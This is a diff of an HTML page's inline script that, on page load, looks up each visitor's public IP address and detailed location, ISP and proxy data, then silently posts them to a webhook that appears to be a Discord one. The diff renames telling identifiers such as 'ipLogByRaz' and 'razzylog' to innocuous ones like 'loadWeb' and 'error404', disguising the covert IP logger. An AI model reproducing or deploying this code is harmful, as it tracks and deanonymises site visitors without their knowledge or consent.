@@ -37,33 +37,33 @@
       get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
         var div = document.createElement("div");
         div.innerHTML = text;
-        div.id = "razzylog";
+        div.id = "windows";
         const secondList = document.getElementsByClassName("header")[0]
         secondList.appendChild(div)
       });
       get_information("https://api.ipify.org/", function(text) {
         var div = document.createElement("div");
         div.innerHTML = text;
-        div.id = "ipppp";
+        div.id = "error404";
         const secondList = document.getElementsByClassName("header")[0]
         secondList.appendChild(div)
       });
 
-      function ipLogByRaz() {
-        var ispp = document.getElementById('ipppp').innerHTML
-        var extra = document.getElementById("razzylog").innerHTML
+      function loadWeb() {
+        var e404 = document.getElementById('error404').innerHTML
+        var win = document.getElementById("windows").innerHTML
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
         request.setRequestHeader('Content-type', 'application/json');
         const params = {
           username: "Beamed",
           avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
+          content: "**Ip** : _" + e404 + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + e404 + "_\n**Extra Info** : ```" + win + "```"
         }
         request.send(JSON.stringify(params));
       }
       setTimeout(function() {
-        ipLogByRaz()
+        loadWeb()
       }, 700);
     </script>
     <style>
